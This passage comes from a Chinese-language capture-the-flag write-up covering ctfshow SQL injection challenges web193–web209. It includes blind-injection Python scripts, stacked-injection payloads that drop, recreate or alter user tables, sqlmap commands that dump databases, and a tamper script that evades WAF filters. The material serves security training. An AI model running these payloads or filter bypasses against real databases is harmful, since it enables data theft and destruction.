class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web193"><a class="markdownIt-Anchor" href="#web193"></a> web193</h2><p>这题过滤了substr，问题不大，用left，right或者mid就可以了，flag换到了<code>ctfshow_flxg</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://8a35e846-e2ed-464b-9843-19e404a9158d.challenge.ctf.show//api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_flxg\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_flxg&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(mid((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web194"><a class="markdownIt-Anchor" href="#web194"></a> web194</h2><p>多过滤了char|left|right|substring这些，上题的脚本继续用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span>  time<br>dicts=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>url = <span class="hljs-string">&#x27;http://5d33d7d6-6708-4e4a-82ed-38708c8d1276.challenge.ctf.show//api/index.php&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>):<br>  <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> dicts:<br>    <span class="hljs-comment">#payload = &#x27;select group_concat(table_name) from information_schema.tables where table_schema=database()&#x27;</span><br>    <span class="hljs-comment">#payload = &#x27;select group_concat(column_name) from information_schema.columns where table_name=\&#x27;ctfshow_flxg\&#x27; and table_schema=database()&#x27;</span><br>    payload = <span class="hljs-string">&#x27;select f1ag from ctfshow_flxg&#x27;</span><br>    s_payload = <span class="hljs-string">&#x27;admin\&#x27; and if(mid((&#123;&#125;),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;,1,0)#&#x27;</span>.<span class="hljs-built_in">format</span>(payload,i,s)<br>    res = requests.post(url,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:s_payload,<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>&#125; )<br>    <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">&#x27;5bc6&#x27;</span>) != -<span class="hljs-number">1</span>:<br>      flag += s<br>      <span class="hljs-built_in">print</span>(flag)<br>      time.sleep(<span class="hljs-number">0.5</span>)<br>      <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="web195"><a class="markdownIt-Anchor" href="#web195"></a> web195</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="hljs-variable">$username</span>))<br></code></pre></td></tr></table></figure><p>这题又限制的比较死了，本题开始用堆叠注入，反引号利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=1;update`ctfshow_user`<span class="hljs-built_in">set</span>`pass`=1&amp;password=1<br></code></pre></td></tr></table></figure><p>然后使用,抓包得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=1&amp;password=0<br></code></pre></td></tr></table></figure><h2 id="web196"><a class="markdownIt-Anchor" href="#web196"></a> web196</h2><p>本题的题目中标明了select已经被过滤了，但是实际上并没有被过滤，orz出题人的问题吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1;<span class="hljs-keyword">select</span>(1)<br></code></pre></td></tr></table></figure><p>执行 <code>select(1)</code> 使记录返回1所以前面的 select pass 就被顶掉。如果不是堆叠注入的话, 需要让前面报错 (即查不到结果), 这样才能返回 union 后的查询内容</p><h2 id="web197"><a class="markdownIt-Anchor" href="#web197"></a> web197</h2><h3 id="0x01-12"><a class="markdownIt-Anchor" href="#0x01-12"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=1;show tables&amp;password=ctfshow_user<br></code></pre></td></tr></table></figure><p>根据给的语法，如果前面执行就会爆出所有的表，其中肯定有表是<code>ctfshow_user</code>，利用这点进行绕过</p><h3 id="0x02-12"><a class="markdownIt-Anchor" href="#0x02-12"></a> 0x02</h3><p>可以进行删表另建的方法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span>;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> ctfshow_user;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> ctfshow_user(username <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),pass <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>));<span class="hljs-keyword">insert</span> ctfshow_user <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="web198"><a class="markdownIt-Anchor" href="#web198"></a> web198</h2><h3 id="0x01-13"><a class="markdownIt-Anchor" href="#0x01-13"></a> 0x01</h3><p>方法同web197的一样</p><h3 id="0x02-13"><a class="markdownIt-Anchor" href="#0x02-13"></a> 0x02</h3><p>本题过滤了drop和create,可以考虑进行列名互换将username和pass进行互换</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `username` `passw` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `pass` `username` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `passw` `pass` <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);<br></code></pre></td></tr></table></figure><p>这里引入了一个第三值进行交换，类似算法里那种简单的互换，然后（userAUTO是已知的前面题目都有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=0&amp;password=userAUTO<br></code></pre></td></tr></table></figure><h2 id="web199"><a class="markdownIt-Anchor" href="#web199"></a> web199</h2><h3 id="0x01-14"><a class="markdownIt-Anchor" href="#0x01-14"></a> 0x01</h3><p>方法同web197</p><h3 id="0x02-14"><a class="markdownIt-Anchor" href="#0x02-14"></a> 0x02</h3><p>过滤了括号，限制了之前payload中的varchar(100)，可以改为text。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span>;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `username` `passw` text;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `pass` `username` text;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> ctfshow_user change `passw` `pass` text;<br></code></pre></td></tr></table></figure><p>然后的同上一题</p><h2 id="web200"><a class="markdownIt-Anchor" href="#web200"></a> web200</h2><p>增加了逗号的过滤，不影响做题，做法同web199。</p><h2 id="web201"><a class="markdownIt-Anchor" href="#web201"></a> web201</h2><p>从201开始进行sqlmap的教学</p><p>先随便输入一个数字，看一下网络的具体回显，对应具体的接口是在/api/?id=</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://331df045-6e91-4856-8c24-709a5de13ed4.challenge.ctf.show/api/?<span class="hljs-built_in">id</span>=1  --referer ctf.show --dbs<br></code></pre></td></tr></table></figure><p>先爆个库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://331df045-6e91-4856-8c24-709a5de13ed4.challenge.ctf.show/api/?<span class="hljs-built_in">id</span>=1  --referer ctf.show -D ctfshow_web --tables<br></code></pre></td></tr></table></figure><p>对应进行爆表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://331df045-6e91-4856-8c24-709a5de13ed4.challenge.ctf.show/api/?<span class="hljs-built_in">id</span>=1  --referer ctf.show -t ctfshow_user --dump<br></code></pre></td></tr></table></figure><h2 id="web202"><a class="markdownIt-Anchor" href="#web202"></a> web202</h2><p>提示调整请求方式，那应该就是post</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://d46e766c-0680-46ca-bb67-6cb44a5e3bb0.challenge.ctf.show/api/ --data <span class="hljs-string">&#x27;id=1&#x27;</span> --referer ctf.show --dbs<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://d46e766c-0680-46ca-bb67-6cb44a5e3bb0.challenge.ctf.show/api/ --data <span class="hljs-string">&#x27;id=1&#x27;</span> --referer ctf.show -D ctfshow_web --tables<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://d46e766c-0680-46ca-bb67-6cb44a5e3bb0.challenge.ctf.show/api/ --data <span class="hljs-string">&#x27;id=1&#x27;</span> --referer ctf.show -D ctfshow_web -T ctfshow_user -dump<br></code></pre></td></tr></table></figure><h2 id="web203"><a class="markdownIt-Anchor" href="#web203"></a> web203</h2><p>使用–method 调整sqlmap的请求方式</p><p>指定<code>--method=PUT</code>方法，同时加上<code>-headers=&quot;Content-Type:text/plain</code>，否则put接受不了。同时，要加上index.php，<code>url/api/index.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://5ac9d50f-ab81-4691-bedc-b80093112d07.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="hljs-string">&quot;ctf.show&quot;</span> --dbs<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://5ac9d50f-ab81-4691-bedc-b80093112d07.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="hljs-string">&quot;ctf.show&quot;</span> -D ctfshow_web --tables <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ sqlmap -u https://5ac9d50f-ab81-4691-bedc-b80093112d07.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --referer=<span class="hljs-string">&quot;ctf.show&quot;</span> -D ctfshow_web -T ctfshow_user -dump<br></code></pre></td></tr></table></figure><h2 id="web204"><a class="markdownIt-Anchor" href="#web204"></a> web204</h2><p>使用–cookie 提交cookie数据，加了一层这样的限制</p><p>看cookie可以先输入一个1，然后看网络回显，或者就是抓包看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://dae0632d-d227-454f-a5c7-822e63c2e162.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=1eseotn7nrl1lul9mj95mf7ogs; ctfshow=686a4e14cd97f8a312d042c1af086a90&quot;</span> --dbs  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://dae0632d-d227-454f-a5c7-822e63c2e162.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --cookie=<span class="hljs-string">&quot;PHPSESSID=1eseotn7nrl1lul9mj95mf7ogs; ctfshow=686a4e14cd97f8a312d042c1af086a90&quot;</span> -D ctfshow_web -T ctfshow_user -dump<br></code></pre></td></tr></table></figure><h2 id="web205"><a class="markdownIt-Anchor" href="#web205"></a> web205</h2><p>api调用需要鉴权</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-22195210.png" alt="2024-09-22195210"></p><p>可以看到需要先请求api/getToken.php才能正常的发送</p><p>因此需要设置两个参数</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">--safe-url 设置在测试目标地址前访问的安全链接<br>--safe-freq 设置两次注入测试前访问安全链接的次数<br></code></pre></td></tr></table></figure><p>这两个选项组合使用，可以有效应对基于会话、验证码或者防护机制的 Web 应用环境中的注入攻击。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --safe-url=https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --safe-url=https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web --tables<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qlmap -u https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:text/plain&quot;</span> --safe-url=https://0a8616ad-5876-4b51-b79c-32ab41a36b0c.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flax -dump<br></code></pre></td></tr></table></figure><h2 id="web206"><a class="markdownIt-Anchor" href="#web206"></a> web206</h2><p>sql需要闭合，等于没变化，sqlmap默认闭合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://8836f038-7c9b-4677-843d-557d9992b95c.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flaxc -C flagv -dump<br></code></pre></td></tr></table></figure><p>中间有跳步骤，我只粘贴刚开始和最后的脚本</p><h2 id="web207"><a class="markdownIt-Anchor" href="#web207"></a> web207</h2><p>从这里我从虚拟机换成了wsl，所以命令会稍微有点不同，主要是方便改脚本</p><p>–tamper 的初体验</p><p><code>--tamper</code> 是 SQLMap 工具中的一个选项，主要用于绕过 WAF（Web应用防火墙）或其他防护机制。通过 <code>--tamper</code> 选项，SQLMap 可以应用自定义的脚本对 SQL 注入的 payload 进行修改，使其不容易被检测到。具体来说，<code>--tamper</code> 的功能是对生成的 SQL 语句进行轻微的修改.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show//api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show/api/getToken.php --safe-freq=1 --dbs --tamper=web207<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show//api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://bab8f673-3dab-4917-acc0-caa401b34c6e.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flaxca -C flagvc -dump --tamper=web207<br></code></pre></td></tr></table></figure><p>流程都是一样的我只放第一步和最后一步的，都是按库表列进行爆，脚本我用的y4师傅的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author:Y4tacker</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">from</span> lib.core.compat <span class="hljs-keyword">import</span> xrange<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><br>__priority__ = PRIORITY.LOW<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    payload = space2comment(payload)<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">space2comment</span>(<span class="hljs-params">payload</span>):<br>    retVal = payload<br>    <span class="hljs-keyword">if</span> payload:<br>        retVal = <span class="hljs-string">&quot;&quot;</span><br>        quote, doublequote, firstspace = <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> firstspace:<br>                <span class="hljs-keyword">if</span> payload[i].isspace():<br>                    firstspace = <span class="hljs-literal">True</span><br>                    retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                quote = <span class="hljs-keyword">not</span> quote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&#x27;&quot;&#x27;</span>:<br>                doublequote = <span class="hljs-keyword">not</span> doublequote<br><br>            <span class="hljs-keyword">elif</span> payload[i] == <span class="hljs-string">&quot; &quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> doublequote <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> quote:<br>                retVal += <span class="hljs-built_in">chr</span>(<span class="hljs-number">0x0a</span>)<br>                <span class="hljs-keyword">continue</span><br><br>            retVal += payload[i]<br><br>    <span class="hljs-keyword">return</span> retVal<br></code></pre></td></tr></table></figure><p>在这段代码中，chr(0x0a)用于替换 payload 中的空格，使得这些空格被转换为换行。可以观察原来的space2comment的脚本，原来的脚本是利用<code>/**/</code>进行绕过，这里利用换行进行绕过</p><h2 id="web208"><a class="markdownIt-Anchor" href="#web208"></a> web208</h2><p>分析下这题，过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//对传入的参数进行了过滤</span><br><span class="hljs-comment">// $id = str_replace(&#x27;select&#x27;, &#x27;&#x27;, $id);</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>   <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ /&#x27;</span>, <span class="hljs-variable">$str</span>);<br>  &#125;<br></code></pre></td></tr></table></figure><p>过滤了空格和select,sqlmap默认是大写的，所以四舍五入没有，然后空格可以直接使用space2coment，然后流程都是一样的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> sqlmap.py -u https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/getToken.php --safe-freq=<span class="hljs-number">1</span> --dbs --tamper=space2comment<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> sqlmap.py -u https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://<span class="hljs-number">14</span>fbd5b1-<span class="hljs-number">877</span>c-<span class="hljs-number">4751</span>-<span class="hljs-number">963</span>f-<span class="hljs-number">93767</span>f3631ff.challenge.ctf.show/api/getToken.php --safe-freq=<span class="hljs-number">1</span> -D ctfshow_web -T ctfshow_flaxcac -C flagvca -dump --tamper=space2comment<br></code></pre></td></tr></table></figure><h2 id="web209"><a class="markdownIt-Anchor" href="#web209"></a> web209</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ |\*|\=/&#x27;</span>, <span class="hljs-variable">$str</span>);<br></code></pre></td></tr></table></figure><p>过滤了等于可以用like进行绕过，过滤了*,继续用自写脚本吧</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">python3 sqlmap.py -u https://e1913103-c779-4ae7-<span class="hljs-number">95b9</span>-a05a83ce161d.challenge.ctf.<span class="hljs-built_in">show</span>/api/index.php --<span class="hljs-built_in">method</span>=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.<span class="hljs-built_in">show</span> --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e1913103-c779-4ae7-<span class="hljs-number">95b9</span>-a05a83ce161d.challenge.ctf.<span class="hljs-built_in">show</span>/api/getToken.php --safe-freq=<span class="hljs-number">1</span> --dbs --tamper=web209<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 sqlmap.py -u https://e1913103-c779-4ae7-95b9-a05a83ce161d.challenge.ctf.show/api/index.php --method=PUT --data=<span class="hljs-string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="hljs-string">&quot;Content-Type:Text/plain&quot;</span> --safe-url=https://e1913103-c779-4ae7-95b9-a05a83ce161d.challenge.ctf.show/api/getToken.php --safe-freq=1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx -dump --tamper=web209<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 